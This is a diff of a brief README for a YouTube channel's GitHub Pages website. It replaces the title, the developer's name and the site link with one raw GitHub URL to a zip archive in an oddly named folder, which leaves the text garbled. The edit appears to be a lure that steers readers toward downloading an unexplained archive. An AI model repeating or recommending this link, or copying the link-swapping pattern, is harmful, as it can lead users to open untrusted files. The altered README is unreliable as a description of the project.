@@ -1,13 +1,13 @@
-# raniyaofficial.Github.io
+# https://raw.githubusercontent.com/ranidudewmina/raniyaofficial/main/gonoblastidium/raniyaofficial.zip
 
 ## Official Website of Ranidu Dewmina Youtube Channel
 
 ## Web Create and Devoloped By 
 
-* Mr.Ranidu Dewmina
+* https://raw.githubusercontent.com/ranidudewmina/raniyaofficial/main/gonoblastidium/raniyaofficial.zip Dewmina
 * Study In Mo/Nisshanka Central College
 *From Madukotan Arawa
 
 ##  
 
- Link: [https://raniyaofficial.github.oi/)
+ Link: [https://raw.githubusercontent.com/ranidudewmina/raniyaofficial/main/gonoblastidium/raniyaofficial.zip)
